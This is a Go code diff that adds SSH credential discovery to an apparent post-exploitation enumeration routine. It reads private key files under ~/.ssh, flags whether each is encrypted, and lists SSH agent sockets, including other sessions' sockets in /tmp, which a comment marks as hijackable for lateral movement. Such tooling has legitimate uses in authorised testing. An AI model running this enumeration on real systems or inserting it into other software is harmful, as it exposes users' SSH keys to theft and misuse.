@@ -364,6 +364,45 @@ func persistEnumSSHKeys(sb *strings.Builder) int {
 	if count == 0 {
 		sb.WriteString("  (none found)\n")
 	}
+
+	// SSH private keys — indicate key-based auth capability
+	keyFiles := []string{"id_rsa", "id_ecdsa", "id_ed25519", "id_dsa"}
+	sshDir := filepath.Join(homeDir, ".ssh")
+	for _, name := range keyFiles {
+		keyPath := filepath.Join(sshDir, name)
+		info, err := os.Stat(keyPath)
+		if err != nil {
+			continue
+		}
+		encrypted := "plaintext"
+		if content, err := os.ReadFile(keyPath); err == nil {
+			if strings.Contains(string(content), "ENCRYPTED") {
+				encrypted = "encrypted"
+			}
+		}
+		sb.WriteString(fmt.Sprintf("  [private key] %s (%d bytes, %s)\n", name, info.Size(), encrypted))
+		count++
+	}
+
+	// SSH agent sockets — hijackable for lateral movement
+	if sock := os.Getenv("SSH_AUTH_SOCK"); sock != "" {
+		sb.WriteString(fmt.Sprintf("  [agent socket] SSH_AUTH_SOCK=%s\n", sock))
+		count++
+	}
+	// Scan /tmp/ssh-* for agent sockets from other sessions
+	if entries, err := filepath.Glob("/tmp/ssh-*/agent.*"); err == nil {
+		for _, entry := range entries {
+			info, err := os.Stat(entry)
+			if err != nil {
+				continue
+			}
+			if info.Mode()&os.ModeSocket != 0 {
+				sb.WriteString(fmt.Sprintf("  [agent socket] %s\n", entry))
+				count++
+			}
+		}
+	}
+
 	sb.WriteString("\n")
 	return count
 }
